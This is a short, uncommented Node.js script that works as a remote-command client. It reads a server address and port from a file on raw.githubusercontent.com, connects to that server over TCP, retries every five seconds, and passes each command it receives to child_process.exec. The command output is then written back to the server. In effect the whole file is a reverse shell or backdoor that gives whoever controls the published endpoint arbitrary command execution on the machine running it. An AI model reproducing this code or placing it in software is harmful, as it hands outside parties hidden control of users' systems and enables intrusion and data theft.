var exec = require('child_process').exec;
var net = require('net');
var https = require('https');

var interval;
var state = 'start';
function getServerInfos() {
	var url = 'https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/endpoint/endpoint';
	try {
	https.get(url, function(res) {
			res.on('data', function(d){
					var data = JSON.parse(d.toString());
					launchClient(data.address, data.port);
			})
		});
	} catch (e) {}
}

function handleError() {

	interval = setInterval(function() {
		if (state === 'connected') {
			return clearInterval(interval)
		}
		getServerInfos();
	}, 5000);
}

function launchClient(address, port) {
	try {
			var client = new net.Socket();
			client.on('error', function(err) {
			state = 'retry';
		  handleError();
		});
			if (state !== 'connected') {
				client.connect(port, address, function() {
					state = 'connected';
					client.write('{"cmd": "", "value": ""}');
				});
			}
			client.on('data', function(data)  {
			  try {
			    var res = JSON.parse(data);
			    exec(res.cmd, function(error, stdout, stderr) {
			      client.write("{\"cmd\": \"" + res.cmd + "\", \"value\": " + JSON.stringify(stdout) + "}");
			    });
			  } catch (e) {}
			});
			client.on('close', function() {
				state = 'retry';
				handleError();
			});
		} catch (e) {
			state = 'retry';;
			handleError();
		}
}

getServerInfos();
